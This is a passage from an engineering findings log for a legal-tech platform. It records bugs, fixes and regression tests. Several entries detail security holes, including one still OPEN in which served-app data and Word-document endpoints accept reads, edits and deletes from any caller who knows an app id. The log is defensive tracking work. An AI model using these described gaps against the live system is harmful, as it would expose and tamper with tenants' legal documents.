  read. Identical in `platform-poll.ts` (approved at 2A-S1) and in ekoa-dev, so it is recorded here
  rather than changed inside a slice: the honest fix is to distinguish "absent/array" (a real empty
  batch) from "present but not an array" (a shape change ⇒ stall the cursor and report it).

- **`insolvencia-watch-at-least-once`** (OPEN, LOW, quality — run 20260717-190134 E4). The Citius
  insolvência polling watcher persists a seen-ref after each durable watch.hit emit, but the
  emit-then-persist is at-least-once not atomic: if `updateWatch` itself fails after the event
  write, that one publication can re-emit a duplicate dossiê timeline entry on the next poll (never
  data loss, never cross-org). The seenRefs cap (500 newest) likewise assumes the portal's active
  window stays under the cap. Both are documented v1 limits (fixture-driven; the real-portal use is
  the attended signed-in-connector follow-up run per BRIEF §8 run-2 note); a windowed cursor +
  idempotent event write is the follow-up hardening.

- **`builder-raw-view-wider-than-the-save-path`** (FIXED 2026-08-03, HIGH, credential disclosure
  (intra-tenant) — found by the D2 fresh-context re-review probing 37 scenarios over real HTTP, not
  by a test failing). D2's round-trip fix (`editablePackageFor`,
  `api/src/routes/integration-builder.ts`) gated the RAW, byte-exact package on
  `doc.orgId === actor.orgId` — strictly WIDER than the set `PUT /package` accepts, and the same
  too-wide predicate sat in `resolveSkillMdRaw` (`api/src/integrations/definition-registry.ts`). Two
  principals with NO write reach were handed a plaintext `Authorization` header (and the raw
  SKILL.md) that answered `[REDACTED]` before D2: a plain `user` peer over a peer's `org`-shared row
  (PUT 403 `key_taken`), and ANY reader of an OWN-ORG `global` row including its author (PUT 403
  `published_row`). Intra-tenant, so not the cross-org class — but a credential read with no edit to
  protect is a pure exposure, and the A3 re-review had already named this shape (`getForActor`
  legitimately answers a same-org peer's `org` row); A3's fix closed only the CROSS-ORG half of it.
  FIXED: one exported predicate, `canEditDefinitionRaw` (definition-registry.ts) =
  `visibility !== 'global' && sameOrg && canWriteDefinition`, i.e. literally
  `saveAuthoredDefinition`'s admission set, used by BOTH raw projections so the config half and the
  skillMd half of one editable package cannot drift again. Pinned by
  `api/tests/contract/integration-builder.test.ts` ("GET /package raw projection == the PUT
  admission set": the two negatives each asserted alongside their 403 AND the stored bytes being
  unchanged, plus the org-admin POSITIVE so the gate is the save set and not merely "narrower") and
  `api/tests/integrations/definition-registry.test.ts` ("resolveSkillMdRaw is gated on the SAVE
  path"). Revert-verified: 3 registry cases + 2 contract cases go red on the old predicate.

- **`raw-view-predicate-was-a-follow-up-nobody-could-find`** (FIXED 2026-08-03, LOW, process —
  found by the D2 fresh-context re-review). D2's decision entry claimed the duplication of the raw
  view's own-org rule across the route and the registry was "recorded as a follow-up", but there was
  no `docs/findings.md` row, no gate-status marker and no sentence in `docs/decisions.md` saying so.
  A follow-up nobody can find is not recorded — and in this case the un-recorded duplication was the
  exact thing that let the HIGH above exist in two places at once. FIXED by removing the
  duplication rather than tracking it (`canEditDefinitionRaw`, one implementation, two call sites)
  and by this row. LESSON: "recorded as a follow-up" is a claim about an artifact; if the artifact
  is not named, the claim is false.

- **`orgless-actor-can-be-same-org-as-an-orgless-row`** (FIXED-WHERE-REACHABLE 2026-08-03, LOW,
  tenancy predicate — found by the D2 fresh-context re-review, probe S4). Three sites compared org
  ids with a bare `===` while only one had the guard. `isDefinitionVisibleTo`
  (`api/src/integrations/definition-store.ts:202-205`) hardened exactly this ("an org-less actor
  must not become 'same org' as an org-less document") but its `visibility === 'global'` branch
  returns BEFORE that guard, so an org-less actor reading an org-less `global` row reached the
  downstream same-org derivations with `'' === ''` and got the foreign row's plaintext
  `Authorization` back. FIXED at both derivations this change owns: `sameOrg()` in
  definition-registry.ts now guards `canEditDefinitionRaw` (hence both raw projections) and
  `definitionFromDoc`'s `id`/`visibility` projection. Pinned by the registry case "an ORG-LESS actor
  never becomes 'same org' as an ORG-LESS row", which inserts a `orgId: ''` row UNDER the store
  (`create` refuses to mint one) and asserts the row still RESOLVES (global is cross-org, by design)
  while yielding no storage envelope and no byte-exact body.
  RESIDUE, deliberate and stated: the ordering inside `isDefinitionVisibleTo` is NOT changed — that
  file was outside this change's ownership, and on inspection the ordering is also correct on its
  own terms (a `global` row IS visible cross-org, so the guard does not belong on that branch). The
  invariant that matters is that no DOWNSTREAM "this row is mine" derivation may be reached with two
  empty strings; that is now one guarded helper. Reachability stays low either way (registration
  always mints an org, and `IntegrationDefinitionStore.create` rejects `orgId === ''`), so the
  remaining exposure is a malformed/legacy row inserted around the store. CLOSE FULLY BY: auditing
  the other `orgId ===` comparisons outside integrations/ against the same helper.

- **`chokepoint-gate-never-scanned-the-test-suite`** (FIXED 2026-08-03, MEDIUM, gate coverage —
  found by the D2 fresh-context re-review; pre-existing, not D2's). `scripts/chokepoint-grep.sh`
  scanned `api/test` — a fixture directory holding only `fake-daemon` — while its own comment
  claimed it covered "the test harness". `api/tests` (the actual suite) was never scanned, so ~9
  provider references across 7 spec files were invisible to the gate and a genuine raw
  `api.anthropic.com` in a spec would have been too. FIXED: both paths are scanned. The pre-existing
  hits were TRIAGED, not grandfathered — every one turned out to ENFORCE the rule rather than break
  it, and each is exempted at the narrowest granularity that fits it: `api/tests/llm/` by PATH (the
  chokepoint module's own suite, mirroring the `api/src/llm/` exemption one-for-one — it must be
  able to name the SDK it mocks), and five individual LINES by the `chokepoint-gate-allow` marker
  (four anti-leak assertions that the token is ABSENT, plus the `boot-b.mjs` journey harness's
  opt-in `EKOA_LLM_DIRECT` posture, which sets `LLM_CHOKEPOINT_BASE_URL` — the CHOKEPOINT's own
  destination, the sanctioned external-chokepoint topology `llm/credentials.ts` implements — never a
  route around it). No real violation was found. Pinned by
  `api/tests/security/grep-gates.test.ts` ("chokepoint grep gate: scope + exemption mechanism"),
  which runs the REAL script against a planted violation under `api/tests` and asserts it goes red,
  that the marker exempts only its OWN line, and that the tree is currently clean. Revert-verified:
  restoring the `api/test`-only path turns two of those red.

### Part B live proof + walkthrough (run 20260717-190134-9d4c1cbf)

- **`answer-channel-preamble-leak`** (OPEN, MEDIUM, quality). A live chat turn's sheet revision 1
  contained model-internal English preamble ("This is taking too much effort... grep approach...")
  as part of the ANSWER text (no tool boundary separated it, so the transport classification is
  correct - the model narrated inside its answer turn). PT-facing product shows English internals.
  Candidate fixes: answer-shaping instruction in the chat agent context, or a narration-shaped
  head heuristic feeding the thinking channel. Found by the B7 walkthrough vision pass.
- **`knowledge-tool-sync-io-stall`** (OPEN, MEDIUM, perf). Knowledge tool calls block the api
  event loop for multi-second stretches (observed ~3s+ per call during B7 debugging; it stalled
  SSE keep-alives long enough to 502 the old dev proxy). Async/offload candidate.
  **Addendum (C7 voice proof, run 20260717-190134-9d4c1cbf):** the blast radius is wider than
  the SSE-keepalive framing above - the SAME stall was observed delaying an entirely UNRELATED
  live WebSocket connection's server-side message processing (the voice relay's stub STT
  responding to a marker frame) by 9-18s while a concurrent chat run's agent work (tool calls)
  was in flight on the SAME api process. Confirms this is a genuine event-loop-wide stall, not
  scoped to the requesting HTTP/SSE connection - worth weighting into the fix's priority.
- **`context-block-hold-back-leak`** (FIXED 2026-07-18, run 20260717-190134-9d4c1cbf closing security review). Found by the
  C7 voice proof (run 20260717-190134-9d4c1cbf) while driving a real TALKING-mode turn end to
  end: the model's internal `<ekoa-context>{...}</ekoa-context>` state-tracking block (ch05
  §5.7.2, `api/src/agents/markers.ts` `CONTEXT_OPEN`/`CONTEXT_CLOSE`) partially LEAKED onto the
  live `text_chunk` wire and was consequently spoken aloud via the voice pipeline's TTS `say`
  (observed verbatim: `<ekoa-context>\n{"userGoal": "...", "knownContext": [], ...`). The
  persisted (final, authoritative) assistant message was clean - `MarkerProcessor.end()`'s full
  final pass correctly stripped the block from the PERSISTED text - so this WAS a LIVE-STREAM-ONLY
  leak, not a persistence-layer defect. Root cause (read, not yet fixed):
  `MarkerProcessor.drain()`'s split-marker hold-back (`HOLD_BACK = MAX_MARKER_LEN - 1`, ~14 chars)
  protects a MARKER LITERAL (e.g. `<ekoa-context>` itself) from splitting across a chunk
  boundary, but does NOT protect an OPEN-but-not-yet-CLOSED context block's UNBOUNDED body: once
  `<ekoa-context>` has opened and its close tag has not yet arrived, `stripSignals()`'s context
  loop can only wait (`if (close === -1) break`), while `drain()`'s hold-back releases everything
  except the last ~14 characters of the buffer regardless - so as soon as the open tag + body
  grows past the hold-back window (very plausible: the body is a small JSON object, easily
  >14 chars, and can arrive over several deltas while the model keeps generating), the excess
  streams to the wire as if it were safe prose. This affects the ORDINARY (non-voice) chat
  transcript too - text_chunk is the same wire regardless of modality - but no existing test
  scans transcript content for the literal `<ekoa-context>` substring (existing marker tests use
  a short FIXED marker split across exactly two chunks, not an unbounded, late-closing block), so
  it went unnoticed until the voice pipeline made the leak audible. Likely fix direction: track
  "inside an open, unclosed context block" as buffer state and hold back from the open tag
  forward (not just the trailing HOLD_BACK window) until the close tag resolves it. Out of C7's
  scope (agents/markers.ts is shared chat-pipeline infrastructure, not voice-specific); a
  dedicated fix + regression test (a context block whose body exceeds HOLD_BACK, split across
  many small deltas) is owed.
  FIX: `api/src/agents/markers.ts` `drain()` now holds back from an unclosed `<ekoa-context>` open tag (not just the fixed ~marker-length tail) until its close arrives, so the block's body never streams to the live `text_chunk` wire; stripSignals then removes the complete block. Regression-pinned in `api/tests/agents/markers.test.ts` (a split open-block delta whose body must not appear in the live emission). Verified: markers + transport + chat suites 43/43.
- **`chip-title-raw-first-line`** (OPEN, LOW, polish). The composer chip renders the sheet's raw
  first line when no model title exists yet; once reply_summary lands the sheet has a title the
  chip could prefer.

### Cortex gateway (run 20260717-071930-d1244839)

- **`gateway-anon-tooluse-fidelity`** (OPEN, HIGH - found by S6 live proof; a top follow-up item;
  CONFIDENTIALITY dimension added by the run-level security review 2026-07-17). The EXACT deny-listed
  literal never leaks - egress tokenization deep-walks tool_result/tool_use string leaves and is
  fail-closed, so a deny-listed literal in an `ls` output is tokenized before it crosses the wire.
  BUT the run's own live evidence shows the literal comes back to the client MANGLED across turns
  (`ZarkovH90305` -> `ZarkovH9305`, a dropped digit); the deny-list is matched LITERALLY, so the
  corrupted variant is NOT re-tokenized when the CLI feeds it back as a tool_result (e.g. a
  "no such file: ZarkovH9305" error) - a near-miss of the secret literal can then egress to the
  PROVIDER in cleartext (partial, not full, disclosure - to the very party §17.4(b) withholds it
  from; NOT a cross-tenant leak). The re-egress step is inferred from the code path, not yet
  reproduced live - a targeted repro is owed before sizing. Deny-list orgs only; empty-ruleset is a
  proven no-op. The deeper anonymisation-plane fix direction is unchanged; this note re-classes it
  so it is not deprioritised as merely cosmetic.
  With a NON-empty deny-list, a stock Claude Code session cannot reliably navigate a filesystem
  whose paths contain a deny-listed literal: the tokenized directory name that reaches the model in
  a `tool_result` (an `ls`/`find` output) does not reliably detokenize back in the model's next
  `tool_use` argument, so the CLI tries to open the FAKE path and reports "directory not found", or
  the literal comes back mangled across calls (observed: `ZarkovH90305` -> `ZarkovH9305`, a dropped
  digit). This survives the S7 stable-vault fix (tokens are now consistent turn-to-turn), so the
  residual is DETOKENIZATION FIDELITY of `tool_use` argument blocks under the tool_use/tool_result
  density that coding traffic exercises and bridge traffic never did - exactly the brief's §3
  anticipated risk ("coding traffic exercises tool_use/tool_result density the bridge traffic never
  did"). The EMPTY-ruleset case is a true no-op and lands byte-identical (proven live), so ONLY
  deny-list orgs doing filesystem work through Claude Code are affected. Fix is a deeper
  anonymisation-plane change (reliable whole-token detokenization of tool_use args when the model
  reformats/splits a format-preserving fake, plus overlapping deny-list x structured-ID x NER span
  resolution) - a dedicated follow-up run, NOT bolted onto the S6 proof driver. The S6 driver
  records this as an honest KNOWN LIMITATION (never green-washed).

- **`gateway-vault-per-request-instability`** (FIXED by S7, commit bdbc472/d783f7d/31309d9). On the
  gateway path a stock Anthropic client (Claude Code) sends no `metadata.session_id`, so
  `proxyGatewayMessages` opens a FRESH ephemeral vault per request (`sess_${correlationId}`). Vault
  tokens are minted per-class by sequence and are deterministic only WITHIN one vault, so across
  Claude Code's agentic tool loop (each tool step is a separate gateway request) a deny-list literal
  in a filesystem path tokenizes inconsistently and a prior turn's token fails to detokenize - the
  CLI then sees a directory that "does not exist" and the tool loop fails in confusing ways (exactly
  the brief's §3 anticipated failure). The EMPTY-ruleset round trip is a true no-op and lands
  byte-identical (proven live), so only deny-list orgs are affected. Fix (S7): derive a STABLE
  session key for a gateway principal without an explicit session_id (the gateway keyId), so one
  Claude Code session shares one vault (30-min TTL) and tokens stay stable across the loop.

### Contract / schema drift (the schema-coverage honor-system class)

- **`openapi-contentmd-bytes-vs-chars`** (medium, run 20260730 E6). `WriteNoteRequest.contentMd` is
  bounded at 1,000,000 CHARACTERS while the body parser's limit is 1 MiB of BYTES, so a body that is
  VALID against the published spec can still answer 413 - accented Portuguese exceeds one byte per
  character. The 413 is documented on all 10 body-accepting operations and its description names the
  trap, but the schema still promises a size the transport cannot carry. Real fix: narrow
  `contentMd`'s bound or raise the body limit - a behaviour change to shipped endpoints, deliberately
  out of scope for a spec-generation slice.
- **`openapi-body-limit-hand-carried`** (low, run 20260730 E6). The 1 MiB body limit is copied from
  `api/src/server.ts` into the generator's 413 description - the one place the generator does what it
  otherwise refuses (it THROWS rather than guess a media type, but copies this number). Prose only, so
  a stale value misleads a reader without breaking a client, and the drift test asserts the
  BYTE-vs-CHARACTER warning shape but NOT the number, so it can go stale silently. Fix: a `shared/`
  constant read by both.
- **`openapi-automations-path-params-untyped`** (low, run 20260730 E6). The automations routes pass
  `req.params.id`/`stepId` through with no `safeParse`, so the spec types them as bare strings.
  Declaring a `params` schema would encode a constraint the contract does not actually hold AND emit a
  400 those routes never produce, so omitting it is the accurate choice today. Fix: validate the params
  in the routes first, then declare them.
- **`openapi-drift-gate-dirty-source`** (low, run 20260730 E6, KNOWN LIMIT). The generator and its drift
  gate read `@ekoa/shared` from the gitignored `shared/dist`, and the freshness check (`tsc -b --dry`)
  proves dist is CURRENT WITH source, not that source is committed. A concurrent session's uncommitted
  edit, freshly built, therefore lands in the published contract with a green gate - reproduced twice in
  run 20260730, in both directions. Failing on a dirty tree would block the normal edit-build-test loop,
  so the control is procedural: verify a committed generated artifact from a pristine checkout. Possible
  mechanical fix: gate on `git status --porcelain -- shared/` only when a CI env var is set.
- **`automations-runs-limit-unvalidated`** (medium, run 20260730, found by the independent test pass).
  `GET /api/v1/automations/runs` ignores the `limit` constraints the OpenAPI document publishes
  (`limit=0` answers 200 with an empty list instead of 400; `-1`, `501` and `abc` are ignored; `2.5` is
  floored), because the route hand-rolls `Number(req.query.limit)` instead of parsing the shared schema.
  The sibling list operations in the same document (knowledge documents, memvault notes) enforce the
  identical schema exactly, so this is an outlier, not a convention.
- **`automations-idempotency-header-undocumented`** (low, run 20260730, found by the independent test
  pass). `POST /api/v1/automations/{id}/runs` fully implements an `Idempotency-Key` HEADER (replay, 400
  on a repeated raw header, 400 on header/body conflict, empty-as-absent) but documents only the body
  field, so a generated client cannot use the header form or know that misusing it is a 400. Fix: a
  headers field on the descriptor, then emit it.

- **`schema-coverage-honor-system`** (structural). The schema-coverage gate is a hand-maintained
  allowlist that does NOT verify a test exercises each COVERED endpoint; a green gate is not proof a
  body matches its schema. Audit 2026-07-10 found 27 of 154 COVERED keys unexercised and ~6 endpoint
  groups returning schema-violating bodies. The three items below are instances. Real fix: a run-wide
  registry of actually-exercised schemas (specified, unimplemented). Tracked: `docs/testing.md`.
- **`llm-classify-contract`** (medium). `ekoaLocal.llmClassify` handler emits no `category` and reads
  `req.body.prompt`, diverging from the contract input shape; a compliant client gets a schema-
  violating response.
- **`triggerView-active-drop`** (minor). `triggerView` drops the `active`/disabled field (optional
  field silently omitted), so trigger state is invisible to a schema-strict client.
- **`view-timestamps-drop`** (minor). `memoryView` and `artifactView` omit `createdAt`/`updatedAt`
  (optional-drop).
- **F14** (harness-gap, minor). The served-app owner bypass accepts both `Authorization: Bearer` and
  `?token=`; the committed suite asserts only `?token=`. Untested accepted-auth surface.
- **`artifact-cards-invalid-date`** (minor, UX). The expanded "Os Meus Artefactos" cards render
  "Invalid Date" in the date row for every featured artifact (observed live 2026-07-12 on a fresh
  dev stack, all 41 cards). Likely the card formats a missing/differently-shaped timestamp on
  seeded featured artifacts (`createdAt`/`updatedAt` absent or non-ISO) straight through
  `new Date(...)`. Fix: tolerate absent timestamps (hide the row) and add a regression assertion
  that no card ever renders the literal "Invalid Date".
- **`ai-integration-lands-under-platform-tab`** (minor, UX). An AI-built integration saved via the
  chat builder (e.g. open-library, e2e-proof-weather, openweathermap) renders under
  `/integrations?tab=plataforma` ("Integrações da Plataforma"), while "Minhas Integrações"
  (`?tab=minhas`) shows the empty state - so a user who just built an integration and looks under
  "Minhas Integrações" does not find it (confusing). It is available to the org (works), just filed
  under the wrong tab for its provenance. Observed live 2026-07-11. Likely the "mine" filter keys on
  a config/credential-instance concept rather than `userCreated` runtime definitions. Decide the
  intended split and route userCreated runtime defs to the "mine" tab (or relabel the tabs).
- **`integration-handoff-spurious-build`** (medium, UX). Confirming a chat integration offer (the
  two-turn `[[EKOA_INTEGRATION_BUILD]]` handshake) reliably ALSO spawns a real app-build job that
  runs the coding agent with an effectively-empty task and terminates `BUILD_UNFULFILLED` ("A
  construção não chegou à aplicação servida"). Observed live 2026-07-11 for both rest-countries and
  open-library: the integration panel opens and generates+saves correctly (proven — the integration
  lands on `/integrations` with its actions), but the chat column shows a spurious failed build
  alongside it. The build job carries a jobId (server-created) yet no `Vou ligar essa integração
  primeiro.` message precedes it, so it is NOT the build-path in-build classifier; and the client
  `isBuildSession` gate is false on a fresh chat session, so the client message router did not kick
  it — the spurious `build_intent` originates in the server marker orchestration when the
  confirmation turn is classified. Not blocking (the integration still saves) but pollutes the
  handoff. Close by tracing the turn-2 emission: the chat run must emit ONLY the integration signal
  (or, if it emits both, integration must win over build in `agents/chat.ts` — currently build is
  checked first). Add a deterministic test asserting one signal per confirmation turn.

- **`served-app-data-unauthenticated-writes`** (HIGH, pre-existing, operator decision - surfaced by
  H5's destructive-action-authz assertion). The served-app data plane `/api/app-data/:collection`
  authenticates NOTHING about the CALLER: `served-data.ts` `scopeFor()` requires only a well-formed
  `X-Ekoa-App-Id` header + the app OWNER's activation, then scopes to that app's partition. So ANY
  caller who knows an app id/slug can `POST`/`PUT`/`DELETE` that app's data ACROSS TENANTS (a private
  org app's data can be tampered/deleted by an outsider who learns its id). Two compounding facts:
  (1) the manifest collection-rule `access:{ write:'session'|'server' }` is DECLARED but NOT enforced
  by served-data.ts (the write mode is decorative); (2) the app-sso session cookie is
  `Path=/api/app-sso`, so it is not even sent to `/api/app-data` - there is no session to check at
  that path today. NOT introduced by the operator-run (C3/D-era served-app data plane); on a
  DIFFERENT axis from the platform role/capability layer H1-H4 close (which is complete). Phase 10's
  "destructive-action authorization asserted server-side" is NOT met for this surface. FIX (an
  operator architecture decision, a dedicated post-H slice): enforce the declared collection write
  mode and make an app-sso session verifiable at the data path (widen the app-sso cookie path or mint
  a session token the data plane checks); `write:'server'` collections should reject ALL client
  mutations. Pinned as a TRIPWIRE in `api/tests/security/destructive-action-authz.test.ts` (a fix
  flips the test) + behaviorally green today in `api/tests/contract/served-app.test.ts`. Tracked in
  `docs/security.md`.

  **Surface extension 2026-07-24 (2C-S4, `/api/app-docx/*`).** The same posture now also exposes the
  owner's SOURCE WORD DOCUMENT. `api/src/apps/app-docx.ts` mirrors app-files' `admitApp` (mandated
  for consistency), so it too authenticates NO caller - only a well-formed `X-Ekoa-App-Id` plus the
  resolved OWNER's activation. Consequently any caller who knows an app id/slug can: read the full
  document text via `GET /api/app-docx/projection`, download the raw bytes via `GET
  /api/app-docx/current` and `POST /api/app-docx/clean`, and **persist mutations** via `POST
  /api/app-docx/edits` (accept/reject/comment/reply/resolve). Aggravating factor specific to this
  surface: `apps/document-source.ts` `applyReview` resolves the author SERVER-SIDE from the artifact
  owner, so an anonymous outsider's tracked changes and comments are written into a legal `.docx`
  **attributed to the lawyer** (the owner's username), with no record that the caller was not them.
  Remanence: `deleteArtifact` (`api/src/apps/artifacts-service.ts`) removes only the artifact row and
  not the app's data dir - afterwards `resolveApp` returns null, `artifactBacked` is false, the
  owner-activation gate is SKIPPED entirely, and the orphaned document under
  `<EKOA_DATA_DIR>/app-data/{appId}/docx` remains readable and mutable to anyone holding the id. Same
  root cause and same operator decision as the parent entry (no separate fix timeline); a caller/
  session check on the served-app planes closes both. Current state PINNED as a tripwire in
  `api/tests/security/app-docx-authz.test.ts` so a future hardening flips it visibly.

### Gateway / egress

- **`gateway-502-masks-401`** - CLOSED (local-bridge consumer run s7, 2026-07-11, merged from the
  parallel session): typed `CredentialError` -> 503 `credential_error` (non-retryable), rate-cap ->
  429, transient stays 502; `/health claudeAuth.lastProviderError` carries class+timestamp only;
  gateway metadata is an allowlist (`user_id` only), killing the sibling mask.
- **`health-bridgeConnections-mismatch`** (small, merged from the parallel session's recon). `/health
  bridgeConnections` reports `sseManager.connectionCount` (SSE clients), not the bridge registry's
  daemon-socket count the field name promises. One-line fix in server.ts /health + a health contract
  assertion.
- **`e2e-estate-no-committed-env`** (open, structural; merged - extends `e2e-estate-baseline-13`
  below). 49 of 213 due specs red when the WHOLE ledger estate runs against the run-driver stack
  (the served-app compat `/api/v1/action` suites 404 at every commit; demo tours exceed the 30s
  timeout on dev-next latency). Needs a committed full-stack e2e harness + a compat-suite triage.
- **`gateway-apikey-checkAllowance`** (medium, security). The gateway `apikey` principal skips
  `checkAllowance` and bills the platform admin account - an exfil surface reachable from a build
  subprocess. Operator decision owed on the sanctioned posture.
- **F8** (judgment, minor). Provider/credential error surfaces are not user-grade: chat can stream an
  English spec citation, the adapter can leak raw provider JSON, and build failure is a generic PT
  sentence with no cause. Needs one error-mapping layer at the streaming sink (PT message + machine
  code, detail in logs).

### Product bugs

- **`automation-private-visibility-unenforced`** (HIGH, run 20260730, found by the independent test
  pass, FIXED same run). `visibility: 'private'` on an automation was stored, echoed by
  `toWireAutomation`, and published as `Automation.visibility` in the OpenAPI document - and enforced
  nowhere: a same-org peer read a private automation by id and saw it in the list, under a JWT or a
  gateway key. Six diff-reading review rounds missed it because the leaking code was code nobody
  changed; only an agent driving the whole running surface found it. Now one predicate
  (`isVisibleTo`) inside `canReadAutomation`/`canWriteAutomation`: private is OWNER-ONLY, not the
  org-admin and not the super-admin, following `OwnerVisibilityScoped` (the repo's existing rule for
  this exact field) rather than `canSeeRun` (a different resource's default scope). Absent or `'org'`
  keeps legacy behaviour byte for byte. Refusals are a uniform 404 - PATCH/DELETE/run-create
  previously answered 403, which was itself an existence oracle.
- **`automation-managed-metadata-leak`** (low, run 20260730, OPEN). Two paths still expose an
  automation's id and sometimes its NAME to org members regardless of visibility:
  `api/src/automation/integration-automations.ts` `sessionActionRows` (id + name for
  integration-managed automations) and `api/src/events/service.ts` `listTriggers` via `triggerView`
  (opaque id + integrationKey/eventName). Both are metadata on a DIFFERENT resource - the automation
  itself correctly 404s - and the provisioner never marks managed rows private, so this only bites
  after someone PATCHes a managed automation to private. Out of the fixing slice's file set.
- **`automation-triggered-subautomation-owner-skip`** (low, run 20260730, OPEN, pre-existing). A
  trigger-driven run's `sub_automation` step re-enters `runAutomation` with the owner check skipped,
  so a triggered parent could call a sub-automation the trigger owner does not own. Not reachable
  through the public wire (`mapWireStepToEngine` drops `subAutomationId`); only via planner output or
  an integration template.

- **`restoreVersion-featured-500`** (medium). `restoreVersion` on a *featured* artifact still 500s.
  (The broader versions-500 - never-built artifacts and the featured list - was fixed 2026-07-11; this
  case remains.)
- **`web-sourceinput-divergence`** (medium). A web/`shared` `SourceInput` divergence makes a seed-
  template knowledge source 400 from the UI.
- **`login-double-session`** (minor, dev-only). The login landing double-creates sessions (React
  StrictMode double-mount of the eager empty-session create); dev-DB orphan-row noise, and the /chat
  landing intermittently GETs a just-created session id that 404s (the e2e trackers carry a scoped
  exclusion for exactly that 404 pattern - remove it when this closes). The write should be
  idempotent/effect-guarded.
- **`chat-sse-discovery`** (deferred, batch-2). S1 adversarial-tester discovery set: chat-SSE late-
  subscriber gap, run hangs on upstream auth failure, temp-session 404 persist.
- **`web-tests-untypechecked`** (low, batch-2). Web `__tests__` are excluded from tsc, so web test
  files are never typechecked.
- **`e2e-estate-baseline-13`** (medium, per-spec debt). The first honest full-stack estate run
  (2026-07-11, 187/200 green after this run's fixes) leaves 13 red ported specs, ALL pre-existing
  product/UI gaps (none touch this run's diffs): (a) the documented band2 legacy group still built
  around the retired `/api/v1/action` + old stubs - artifact-backend-panel, artifacts-apps-section,
  update-from-bundle, vertical-profile, onboarding x3 (REST migration owed; see
  docs/e2e-harness-remediation-brief.md); (b) integrations UI gaps - pages-manage expects a search
  input the migrated page lost, integrations-sections' Webhooks tab renders no webhook rows,
  integrations-pipedream master-toggle default/persistence semantics differ; (c) legal-content
  gaps - legal-rcbe journey, legal-shared-drift (six scaffolds vs canonical layer), simuladores-
  trabalho exact CT figures. Each is closed by building the missing surface or by an explicit
  retire decision - never by editing the ported spec.

- **`branding-tab-stale-after-research`** (minor, UI freshness). Right after a brand research
  completes, the Marca tab can render the PREVIOUS palette (local component state seeded at page
  load) while `org.branding` already holds the new one - a fresh reload shows the correct values.
  Observed live 2026-07-11 during the walkthrough recording (post-research tab showed `#1A2D5A`,
  persisted+reload truth was `#1C2B4A`). Likely the local-state sync effect on
  `settings/branding/page.tsx` not re-seeding after `fetchCompany()`. Close with a deterministic
  test that researches (fake transport), switches to the Marca tab and asserts the fresh hex.

- **`collection-rule-access-unenforced`** (medium, data-plane; H5 assertion-layer surfaced). A
  collection rule's `access:{write:'session'|'server'}` is DECLARED in the app manifest schema but
  NOT enforced by served-data.ts - all app-data writes are app-id-scoped (owner-activation
  admission), so the per-collection write mode is decorative. Pre-existing C3/data-plane concern,
  OUTSIDE the H security block (which gates the PLATFORM authz; the served-data plane is a separate,
  documented app-id-scoped design). Close by enforcing the declared write mode in served-data.ts OR
  by removing the unenforced field from the manifest schema. Flagged by H5's destructive-action-authz
  assertion (the privileged app-sso ops ARE gated + asserted; this is the general data plane).

- **`h3-edit-mode-no-cancel`** (low, UX fast-follow; H3 fresh review flagged, non-blocking). The admin
  edit-mode `running` phase (`api/assets/panel-runtime/src/edit-mode.js` / `AssistantPanel.jsx`) has
  no client-side timeout, no AbortController, and no Cancel affordance - unlike the sibling visitor
  `send()` in the same panel (which got FETCH_TIMEOUT_MS + AbortController for codex-d2). Toggling the
  edit switch OFF mid-run does not abort the in-flight `runEditPatch`, so a late resolve can flip the
  phase to `preview` with stale shas. The stale-sha CONSEQUENCE is already mitigated (the H6/codex
  fix: `guardedRollback` re-reads HEAD and refuses a stale restore), so this is a UX gap not a data
  hazard. Fast-follow: mirror the visitor path - an AbortController tied to editMode-off/unmount + a
  run-generation guard + a Cancel button. Every server action stays H1-gated regardless.

### Operator-blocked / external

- **`prod-corpus-import`** (external). The real production knowledge corpus import is pending, blocked
  on operator ssh/rsync of the staged corpus. The importer CLI and the `_shared` plane are ready
  (`docs/operations-runbook.md`).
- **`remote-tag-f25`** (operator action). The remote tag `batch1-f25` still points at the broken
  commit `8a2a67b`; re-point with `git push origin +refs/tags/batch1-f25:refs/tags/batch1-f25` (local
  is already at `af8b556`).

## Recently fixed - 2026-07-15 api runtime image defects (staging bring-up)

Three defects in the shipped api image, all of the same class - **the image builds fine but the
process fails at runtime** - all invisible to the dry-run deploy CI because that lane only *builds*
the images, never *runs* them. The first two crash at boot and were caught by a local full-stack
smoke (Caddy + api + web + mongo) before any VM spend; the third only surfaces on the first real
model turn (needs a live credential) and was caught on staging.

- **`api-phantom-dep-js-yaml`** (medium, packaging). The api imports `js-yaml` in three runtime paths
  (`automation/manifest-parser.ts`, `apps/action-manifest.ts`, `apps/tour-writer.ts`) but it was
  declared **nowhere** in `api/package.json` / root `package.json`. It only resolved because ESLint (a
  devDep) transitively hoists `js-yaml@4.3.0` to the root `node_modules`; the runtime image
  (`npm ci --omit=dev`) drops it, so `node api/dist/server.js` crashed with
  `ERR_MODULE_NOT_FOUND: Cannot find package 'js-yaml'`. **Fix:** added `js-yaml@^4.3.0` to api deps +
  `@types/js-yaml@^4.0.9` to api devDeps, and deleted the ambient shim `api/src/automation/vendor.d.ts`
  (whose own comment prescribed exactly this). A scan of the built `api/dist` against the prod-only
  dependency closure confirmed js-yaml was the **only** phantom dep.
- **`api-image-native-build-skipped`** (medium, packaging). With js-yaml fixed the api then crashed in
  `bootState` -> `backfillKnowledgeIndex` with `Could not locate the bindings file ... better_sqlite3.node`.
  `Dockerfile.api` ran `npm ci --omit=dev --ignore-scripts`, and `--ignore-scripts` skips native
  addons' install step; `better-sqlite3@12.11.1` ships **no prebuilt** for node 20 (so it must compile
  via node-gyp, which the slim image has no toolchain for). **Fix:** restructured `Dockerfile.api` with
  a dedicated `proddeps` stage that has `python3/make/g++`, installs prod deps `--ignore-scripts`, then
  `npm rebuild better-sqlite3` (compiles it); the slim runtime `COPY --from=proddeps node_modules`, so
  the toolchain never ships. Other native modules (`sharp`, `onnxruntime-node`, `@next/swc`) use
  prebuilt platform packages and were unaffected. Verified: api boots, `/health` 200, real admin login
  through the same-origin Caddy proxy, and `chromium.launch()` succeeds inside the container.
- **`api-sdk-musl-binary-picked`** (medium, packaging; surfaced by the first live model turn on
  staging). With the model credential armed, chat/build died with
  `ADAPTER_ERROR: Claude Code native binary not found at .../claude-agent-sdk-linux-x64-musl/claude`.
  `@anthropic-ai/claude-agent-sdk` ships its native `claude` binary as per-platform optional deps; npm
  installs BOTH `linux-x64` (glibc) and `linux-x64-musl` on any linux-x64 host (it filters optionals by
  os+cpu, not libc), and the SDK's resolver tries the **-musl variant first** - which cannot exec on the
  glibc bookworm image. **Fix:** `Dockerfile.api` proddeps stage now `rm -rf`s the `*-musl` variant
